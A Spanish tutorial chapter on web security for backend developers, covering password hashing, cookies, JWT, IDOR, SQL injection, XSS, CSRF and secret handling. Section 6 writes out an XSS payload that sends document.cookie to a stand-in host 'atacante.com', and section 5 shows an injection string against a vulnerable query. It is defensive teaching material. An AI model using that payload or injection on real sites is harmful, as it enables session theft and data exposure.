# Autenticación y seguridad web

Cuando construyas una API, una demo de chatbot o el MVP de un cliente, la seguridad no es un extra: es parte de que funcione. Un
endpoint que deja ver las facturas de otros clientes, una clave del modelo expuesta en el frontend o una consulta SQL armada pegando
texto pueden costarle dinero a tu cliente y a ti tu reputación. Y en las entrevistas de backend estas preguntas salen casi siempre.

La buena noticia: la gran mayoría de los fallos reales son **los mismos de siempre**, y se evitan con unos pocos hábitos. Este capítulo
te los explica con el porqué de cada uno.

---

## 1. Autenticación y autorización

Son dos preguntas distintas, y confundirlas es el origen de muchos fallos:

| | Pregunta | Ejemplo | Si falla |
|---|---|---|---|
| **Autenticación** (*authn*) | ¿**Quién** eres? | Iniciar sesión con email y contraseña | Respuesta `401 Unauthorized` |
| **Autorización** (*authz*) | ¿Qué **puedes** hacer? | Solo puedes ver tus propios pedidos | Respuesta `403 Forbidden` (o `404` para no revelar que existe) |

Un sistema puede autenticar perfectamente y, aun así, dejar que cualquier usuario autenticado vea los datos de los demás. Ese es el fallo
número uno de la lista OWASP (sección 6): **control de acceso roto**.

---

## 2. Contraseñas: cómo se guardan

### Lo que nunca debes hacer

- **Texto plano.** Si alguien obtiene una copia de la base (una copia de seguridad filtrada, una inyección SQL, un empleado), tiene todas
  las contraseñas. Y como la gente las reutiliza, también tiene acceso a su correo y su banco.
- **Cifrarlas con una clave.** El cifrado es reversible: quien consiga la clave (que suele estar en el mismo servidor) las descifra
  todas.
- **Un hash rápido sin sal** (MD5, SHA-1, SHA-256 a secas).

### Hash: una función de un solo sentido

Un **hash** convierte un texto en una huella de tamaño fijo. Es fácil de calcular y prácticamente imposible de revertir:

```python
import hashlib

hashlib.sha256(b"hola").hexdigest()
# 'b221d9dbb083a7f33428d7c2a3c3198ae925614d70210e28716ccaa7cd4ddb79'
```

Para comprobar una contraseña no la "descifras": calculas el hash de lo que escribió el usuario y lo comparas con el guardado.

### Por qué un hash rápido no basta

- **Tablas precalculadas**: los atacantes tienen tablas con el hash SHA-256 de millones de contraseñas comunes. Si dos usuarios usan
  `123456`, tienen el mismo hash, y basta buscarlo.
- **Fuerza bruta**: una tarjeta gráfica calcula **miles de millones** de SHA-256 por segundo. Probar todas las contraseñas de 8 caracteres
  es cuestión de horas.

### Las dos defensas: sal y lentitud

1. **Sal** (*salt*): un valor **aleatorio y distinto para cada usuario** que se mezcla con la contraseña antes de calcular el hash. Dos
   usuarios con la misma contraseña obtienen hashes distintos, y las tablas precalculadas dejan de servir. La sal **no es secreta**: se
   guarda junto al hash, porque hace falta para verificar.
2. **Un algoritmo deliberadamente lento**: repetir el cálculo muchas veces (decenas o cientos de miles de iteraciones) o exigir mucha
   memoria. A un usuario que inicia sesión no le importan 100 ms; a un atacante que quiere probar mil millones de contraseñas le
   multiplica el trabajo por cien mil.

Los algoritmos recomendados: **Argon2id** (la primera opción hoy), **bcrypt**, **scrypt** y **PBKDF2** (incluido en la librería estándar
de Python). En un proyecto real usa una librería que lo haga por ti (`argon2-cffi`, `passlib`, `bcrypt`); es importante entender qué hace
por dentro.

### Cómo se ve por dentro

Ejemplo con **scrypt** (otro algoritmo de la librería estándar), para que veas las piezas:

```python
import hashlib, os

sal = os.urandom(16)                  # 16 bytes aleatorios, criptográficamente seguros
huella = hashlib.scrypt(b"mi clave", salt=sal, n=2**14, r=8, p=1)

print(sal.hex())      # la sal en texto hexadecimal, p. ej. '3f9a...'
print(huella.hex())   # el hash en texto hexadecimal
```

Para verificar más tarde necesitas **todo lo que influye en el resultado**: la sal y los parámetros de costo (en PBKDF2, el número de
iteraciones). Por eso se guardan juntos en un solo texto con un separador, de forma que cada registro "sabe" cómo se calculó. Es lo que
hacen los formatos estándar; por ejemplo, un hash de bcrypt luce así: `$2b$12$<sal><hash>` (algoritmo, costo, sal y hash). Guardar el
costo dentro del registro te permite **subirlo con los años** sin romper las contraseñas antiguas.

Detalles de Python que necesitas:

- `os.urandom(n)` da `n` bytes aleatorios seguros. **No uses el módulo `random`** para nada de seguridad: es predecible. Para tokens,
  usa `secrets` (`secrets.token_urlsafe(32)`).
- Las funciones de hash trabajan con **bytes**: `"texto".encode()` convierte de texto a bytes.
- `bytes.hex()` convierte bytes a texto hexadecimal y `bytes.fromhex("3f9a")` hace lo contrario.
- `"a$b$c".split("$")` separa por el separador; `int("100000")` convierte a número.

### Comparar en tiempo constante

Al comparar dos hashes con `==`, Python se detiene en el **primer carácter distinto**. En teoría, midiendo con mucha precisión cuánto
tarda la comparación, un atacante podría deducir cuántos caracteres acertó (un **ataque de tiempo**). Por eso, para comparar secretos se
usa `hmac.compare_digest(a, b)`, que tarda lo mismo sea cual sea la diferencia.

```python
import hmac
hmac.compare_digest("abc", "abd")   # False, en tiempo constante
```

### Comprueba que entendiste

**Pregunta:** si la sal no es secreta y se guarda junto al hash, ¿para qué sirve?

**Respuesta:** para que la misma contraseña produzca hashes distintos en cada usuario: invalida las tablas precalculadas y obliga al
atacante a atacar cada contraseña por separado.

---

## 3. Sesiones, cookies y JWT

HTTP no tiene memoria: cada petición llega sola. Después de iniciar sesión, el servidor necesita reconocer al usuario en las siguientes
peticiones. Hay dos enfoques.

### Sesiones con cookie

1. El usuario inicia sesión correctamente.
2. El servidor crea una **sesión** (un registro en la base o en Redis) con un identificador aleatorio largo, y lo envía en una
   **cookie**.
3. El navegador envía esa cookie automáticamente en cada petición; el servidor busca la sesión y sabe quién es.
4. Cerrar sesión = **borrar la sesión** del servidor. Es inmediato.

Los **atributos de la cookie** son clave:

| Atributo | Efecto | Protege contra |
|---|---|---|
| `HttpOnly` | El JavaScript de la página no puede leer la cookie | Robo de la sesión mediante XSS |
| `Secure` | Solo se envía por HTTPS | Captura en redes inseguras |
| `SameSite=Lax` | No se envía en la mayoría de peticiones que vienen de otros sitios | CSRF |
| `Max-Age` / `Expires` | Caducidad | Sesiones eternas |

Esta misma plataforma usa una cookie firmada `HttpOnly` para su inicio de sesión.

### JWT (JSON Web Token)

Un **JWT** es un texto con tres partes separadas por puntos: `cabecera.contenido.firma`. El contenido (los *claims*) lleva datos como el
id del usuario y la fecha de caducidad (`exp`), y la **firma** garantiza que nadie lo ha modificado.

```
eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiI0MiIsImV4cCI6MTc2MjAwMDAwMH0 . 3kD9...
     cabecera                      contenido (base64)                firma
```

- El servidor **no guarda nada**: verifica la firma y lee el contenido. Escala bien y sirve entre varios servicios.
- El contenido **no está cifrado**, solo codificado en base64: cualquiera puede leerlo. **Nunca pongas datos sensibles** en un JWT.
- Verifica siempre la firma **y el algoritmo esperado** (fija el algoritmo en el servidor; no aceptes `alg: none`).

**El gran problema: revocar.** Un JWT es válido hasta su fecha de caducidad. Si alguien lo roba, o si el usuario cierra sesión o cambia
la contraseña, el token sigue funcionando hasta que expira, salvo que mantengas una **lista de tokens revocados** (y entonces pierdes la
ventaja de "no guardar nada"). La práctica habitual:

- **Token de acceso de vida corta** (5-15 minutos).
- **Token de refresco** de vida larga, guardado en el servidor (revocable) y en una cookie `HttpOnly`, que sirve para pedir nuevos
  tokens de acceso.

### ¿Cuál elegir?

| Situación | Recomendación |
|---|---|
| Una web con su propio backend (tu MVP, la demo) | **Sesión con cookie** `HttpOnly; Secure; SameSite=Lax`: simple y revocable |
| API consumida por apps móviles o terceros | Tokens (JWT de vida corta + refresco) o claves de API |
| Varios servicios que deben validar al usuario | JWT |
| "No quiero programar esto" | Un proveedor de autenticación (Auth0, Clerk, Supabase Auth, Firebase Auth) |

**Dónde no guardar el token en el navegador:** `localStorage` es accesible para cualquier JavaScript de la página. Si tienes un fallo XSS,
el atacante se lleva el token. Una cookie `HttpOnly` no se puede leer desde JavaScript.

---

## 4. Autorización: comprobarlo en cada recurso

El fallo más común en APIs se llama **IDOR** (*Insecure Direct Object Reference*). El endpoint comprueba que hay sesión, pero no que el
recurso pertenezca al usuario:

```python
# MAL: cualquier usuario autenticado ve cualquier pedido cambiando el número de la URL
@app.get("/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario=Depends(usuario_actual)):
    return db.get(Pedido, pedido_id)
```

El usuario 7 pide `/pedidos/1001` (suyo), luego prueba `/pedidos/1002`, `/pedidos/1003`... y ve los de todos. La corrección: comprobar la
**propiedad** del recurso en el servidor.

```python
@app.get("/pedidos/{pedido_id}")
def ver_pedido(pedido_id: int, usuario=Depends(usuario_actual)):
    pedido = db.get(Pedido, pedido_id)
    if pedido is None or not puede_editar_pedido(usuario, pedido):
        raise HTTPException(404)          # 404: no revela si el pedido existe
    return pedido
```

### Escribir la regla como una función

Conviene escribir las reglas de permisos como **funciones puras** (reciben datos, devuelven `True`/`False`): son fáciles de leer, de
reutilizar y de probar. Ejemplo con otra regla, la de editar un artículo de un blog:

```python
def puede_editar_articulo(usuario, articulo):
    if usuario is None:                       # sin sesión: nunca
        return False
    if usuario["rol"] == "editor":            # los editores pueden editar todo
        return True
    return articulo["autor_id"] == usuario["id"]   # los autores, solo lo suyo
```

Fíjate en el orden y en los principios:

- **Negar por defecto**: primero los casos en que se niega (sin sesión), y al final solo se permite lo que cumple una regla explícita.
- **Comprobar `None` antes de acceder a sus campos**: `usuario["rol"]` con `usuario = None` lanzaría un error.
- **La comprobación vive en el servidor.** Ocultar un botón en el frontend no es seguridad: cualquiera puede llamar a la API directamente
  con `curl`.
- **No confíes en datos del cliente para decidir permisos**: si el rol o el id del usuario vienen en el cuerpo de la petición, el usuario
  puede cambiarlos. Salen de la **sesión** verificada.

---

## 5. Inyección SQL

Ocurre cuando construyes una consulta **pegando texto del usuario** dentro del SQL:

```python
# MAL
nombre = request.query_params["nombre"]
cursor.execute(f"SELECT * FROM productos WHERE nombre = '{nombre}'")
```

Si el usuario escribe `' OR '1'='1`, la consulta queda así:

```sql
SELECT * FROM productos WHERE nombre = '' OR '1'='1'
```

...que devuelve **todas** las filas. Con otras entradas, un atacante puede leer otras tablas (contraseñas incluidas) o, según los
permisos, borrar datos.

### La solución: consultas parametrizadas

El SQL lleva **marcadores** y los valores se pasan **por separado**. El driver de la base envía los valores como datos, nunca como parte
del código SQL, así que no importa qué caracteres contengan.

```python
# BIEN (psycopg usa %s como marcador; sqlite3 usa ?)
sql = "INSERT INTO productos (nombre, precio) VALUES (%s, %s)"
parametros = ("Lámpara", 24.90)
cursor.execute(sql, parametros)
```

Detalles importantes:

- Los parámetros van en una **tupla** (o lista), aunque haya uno solo. Una tupla de un elemento lleva coma: `(valor,)`. Sin la coma,
  `(valor)` es solo un valor entre paréntesis.
- El marcador va **sin comillas**: `WHERE nombre = %s`, no `'%s'`. El driver se encarga de las comillas.
- Aunque el marcador `%s` se parezca al formato de texto antiguo de Python, **no** se usa `sql % valores`: se pasan los dos por separado a
  `execute`.
- Los marcadores sirven para **valores**, no para nombres de tablas o columnas. Si necesitas un nombre dinámico (ordenar por la columna
  que elige el usuario), compáralo con una **lista blanca** de nombres permitidos.
- Los ORM (SQLAlchemy) parametrizan por ti. Pero si usas `text("... " + variable)`, vuelves a estar en peligro.
- **Defensa extra**: que el usuario de la base tenga solo los permisos necesarios. El sandbox SQL de esta plataforma, por ejemplo, ejecuta
  tus consultas con un rol de solo lectura, en una transacción `READ ONLY` y con un límite de tiempo.

---

## 6. XSS (Cross-Site Scripting)

Ocurre cuando tu web muestra texto de un usuario **como HTML**. Si un usuario guarda como nombre:

```html
<script>fetch('https://atacante.com/?c=' + document.cookie)</script>
```

...y tu página lo inserta tal cual, ese script se ejecuta **en el navegador de cada persona que vea el nombre**, con su sesión.

### La defensa: escapar al mostrar

**Escapar** es reemplazar los caracteres con significado especial en HTML por sus **entidades**, para que el navegador los muestre como
texto en vez de interpretarlos:

| Carácter | Entidad | Por qué es peligroso |
|---|---|---|
| `<` | `&lt;` | Abre etiquetas |
| `>` | `&gt;` | Cierra etiquetas |
| `"` | `&quot;` | Cierra atributos entre comillas dobles |
| `'` | `&#x27;` | Cierra atributos entre comillas simples |
| `&` | `&amp;` | Inicia las propias entidades |

Así, `<b>` se convierte en `&lt;b&gt;`, y el navegador muestra literalmente `<b>` en pantalla.

**Una trampa sutil: el orden de los reemplazos.** Si haces reemplazos en cadena con `str.replace`, cada reemplazo actúa sobre el
resultado del anterior. Las entidades contienen `&`. Piensa qué pasa con el texto `<` si primero lo conviertes en `&lt;` y **después**
reemplazas cada `&`: obtendrías `&amp;lt;`, y en pantalla se vería `&lt;` en lugar de `<`. Este fallo se llama **doble escape**.
Pregúntate qué reemplazo debe ocurrir antes para que ninguno estropee lo que hicieron los otros.

En la práctica:

- **React escapa automáticamente** todo lo que pones entre llaves `{texto}`. El peligro aparece al usar `dangerouslySetInnerHTML` o al
  convertir Markdown/HTML de usuarios sin limpiarlo (usa una librería como DOMPurify).
- En Python, `html.escape(texto)` hace el escape por ti; las plantillas de Jinja2 escapan automáticamente.
- **Cuidado con las respuestas de un LLM**: el modelo puede devolver HTML o Markdown con enlaces o imágenes que, si los renderizas sin
  filtrar, sirven para XSS o para filtrar datos. Trata la salida del modelo como **entrada no confiable**.
- La cabecera **Content-Security-Policy** limita desde dónde puede cargarse y ejecutarse JavaScript: una segunda capa de defensa.

---

## 7. CSRF (Cross-Site Request Forgery)

Estás conectado a tu banco. Visitas otra página que contiene un formulario oculto que se envía solo a `banco.com/transferir`. Como el
navegador añade **automáticamente** las cookies de `banco.com`, la petición llega con tu sesión.

Defensas:

- Cookies con **`SameSite=Lax`** (o `Strict`): el navegador no las envía en peticiones `POST` que vienen de otros sitios. Hoy es la
  defensa principal y el valor por defecto de los navegadores modernos.
- **Tokens CSRF**: un valor aleatorio en cada formulario que el servidor comprueba.
- **No cambiar datos con `GET`**: las peticiones `GET` deben ser de solo lectura.
- Si tu API usa tokens en la cabecera `Authorization` (no cookies), CSRF no aplica, porque el navegador no añade esa cabecera solo.

### CORS no es una defensa contra todo

**CORS** decide qué otros orígenes (dominios) pueden **leer las respuestas** de tu API desde JavaScript. Configúralo con la lista exacta
de tus dominios (`CORS_ORIGINS` en esta plataforma) y nunca `*` junto con credenciales. Pero CORS **no impide** que un atacante llame a
tu API con `curl`: la autenticación y la autorización siguen siendo obligatorias.

---

## 8. Secretos y claves de API

Una clave de API (la del modelo de IA, la de Stripe, la de la base de datos) es **dinero y datos**. Reglas:

- **Nunca en el código** ni en el repositorio. Si una clave llega a GitHub, aunque la borres en el siguiente commit, sigue en el
  historial, y hay bots que rastrean GitHub en busca de claves en minutos. Si ocurre: **revócala y crea otra** inmediatamente.
- **Variables de entorno** (`os.environ["ANTHROPIC_API_KEY"]`), un archivo `.env` incluido en `.gitignore` para desarrollo, y el panel
  de secretos del proveedor (Vercel, Railway) en producción. Incluye un `.env.example` con los nombres de las variables y valores vacíos.
- **Nunca en el frontend.** Todo lo que está en el código de React (incluidas las variables `VITE_...`) lo puede ver cualquiera desde el
  navegador. El frontend llama a **tu backend**, y el backend llama al modelo con la clave.
- **Mínimo privilegio**: claves con los permisos justos y, cuando el proveedor lo permite, con límite de gasto.
- **No las escribas en los logs** ni en los mensajes de error.

---

## 9. Las fallas más comunes: OWASP Top 10

**OWASP** es una fundación que publica la lista de los riesgos más frecuentes en aplicaciones web. Conviene conocerla por su nombre para
las entrevistas:

| Riesgo | En una frase | Defensa principal |
|---|---|---|
| Control de acceso roto | Ver o cambiar datos de otros (IDOR) | Comprobar la propiedad en cada endpoint |
| Fallos criptográficos | Contraseñas mal guardadas, datos sin HTTPS | Argon2/bcrypt, HTTPS siempre |
| Inyección | SQL, comandos del sistema | Consultas parametrizadas, no usar `shell=True` con texto del usuario |
| Diseño inseguro | El fallo está en la lógica, no en el código | Pensar los abusos al diseñar ("¿y si alguien pide 10 000 cupones?") |
| Mala configuración | Modo debug en producción, CORS `*`, claves por defecto | Revisar la configuración de producción |
| Componentes vulnerables | Dependencias desactualizadas | `pip-audit`, `npm audit`, Dependabot |
| Fallos de autenticación | Sin límite de intentos, sesiones que no caducan | Limitar intentos, caducidad, MFA |
| Integridad de software y datos | Dependencias o actualizaciones no verificadas | Fijar versiones, verificar orígenes |
| Registro y monitoreo insuficientes | Nadie se entera del ataque | Logs de accesos y errores, alertas |
| SSRF | Tu servidor hace peticiones a URLs que elige el atacante | Lista blanca de destinos |

Para las apps con IA existe además el **OWASP Top 10 para aplicaciones con LLM**, encabezado por la **inyección de instrucciones**. Lo
verás en *Evaluación y seguridad de sistemas de IA*.

---

## 10. Defensa en profundidad y una lista práctica

Ninguna defensa es perfecta, así que se ponen **varias capas**: si una falla, la siguiente frena el ataque. Por ejemplo, frente a una
inyección SQL: consultas parametrizadas + un usuario de base con permisos mínimos + logs que detectan consultas raras.

Lista para revisar tu demo o el MVP de un cliente antes de publicarlo:

- [ ] HTTPS en todo el sitio.
- [ ] Contraseñas con Argon2/bcrypt, o un proveedor de autenticación.
- [ ] Cookies de sesión `HttpOnly`, `Secure` y `SameSite=Lax`.
- [ ] Cada endpoint comprueba la autorización sobre el recurso concreto.
- [ ] Todas las consultas SQL parametrizadas.
- [ ] Nada de HTML de usuarios o del modelo sin escapar o limpiar.
- [ ] Claves solo en variables de entorno del backend; `.env` en `.gitignore`.
- [ ] CORS con la lista exacta de dominios.
- [ ] Límite de peticiones (*rate limiting*) en el login y en los endpoints que cuestan dinero (las llamadas al LLM).
- [ ] Errores genéricos al usuario (sin trazas internas) y detallados solo en los logs.
- [ ] Dependencias revisadas con `pip-audit` / `npm audit`.

---

## Resumen del capítulo

| Concepto | Lo esencial |
|---|---|
| Authn vs authz | Quién eres (401) vs qué puedes hacer (403/404) |
| Contraseñas | Hash lento con sal (Argon2, bcrypt, PBKDF2); sal y costo guardados con el hash |
| Comparar secretos | `hmac.compare_digest`, en tiempo constante |
| Aleatoriedad | `os.urandom` / `secrets`, nunca `random` |
| Sesiones | Cookie `HttpOnly; Secure; SameSite=Lax`; revocables |
| JWT | Firmado pero legible; difícil de revocar: vida corta + refresco |
| Autorización | Negar por defecto, comprobar la propiedad en el servidor, `None` primero |
| Inyección SQL | Parámetros separados del SQL; tupla con coma; listas blancas para nombres |
| XSS | Escapar al mostrar; cuidado con el orden y el doble escape; salida del LLM no confiable |
| CSRF | `SameSite`, tokens, nada de cambios con `GET` |
| Secretos | Variables de entorno, nunca en el frontend ni en el repositorio |

## Autoevaluación final

1. Un usuario autenticado puede ver los pedidos de otros cambiando el id en la URL. ¿Es un fallo de autenticación o de autorización?
   ¿Cómo se llama?
2. ¿Por qué SHA-256 sin sal no es adecuado para contraseñas, aunque sea un buen hash?
3. ¿Por qué hay que guardar la sal y el número de iteraciones junto al hash?
4. ¿Qué diferencia hay entre `("x")` y `("x",)` en Python, y por qué importa al pasar parámetros a `execute`?
5. ¿Por qué el marcador `%s` no lleva comillas en una consulta parametrizada?
6. Al escapar HTML con reemplazos en cadena, ¿qué problema aparece si el orden es incorrecto?
7. ¿Qué atributo de cookie protege contra XSS y cuál contra CSRF?
8. Tu frontend de React necesita llamar a un LLM. ¿Dónde va la clave?

**Respuestas:** 1) De autorización; se llama IDOR (control de acceso roto). 2) Porque es rápido (permite probar miles de millones por
segundo) y sin sal la misma contraseña da el mismo hash (tablas precalculadas). 3) Porque son necesarios para recalcular el mismo hash al
verificar; además permite cambiar el costo en el futuro sin romper los registros antiguos. 4) `("x")` es solo el texto `"x"`; `("x",)` es
una tupla de un elemento. El driver espera una secuencia de parámetros. 5) Porque el driver envía el valor como dato y se encarga él del
formato; con comillas, el marcador se trataría como texto literal. 6) El doble escape: un reemplazo posterior vuelve a transformar el `&`
de las entidades ya generadas. 7) `HttpOnly` limita el daño de un XSS (el script no puede leer la cookie); `SameSite` protege contra CSRF.
8) Solo en el backend, como variable de entorno; el frontend llama a tu backend.
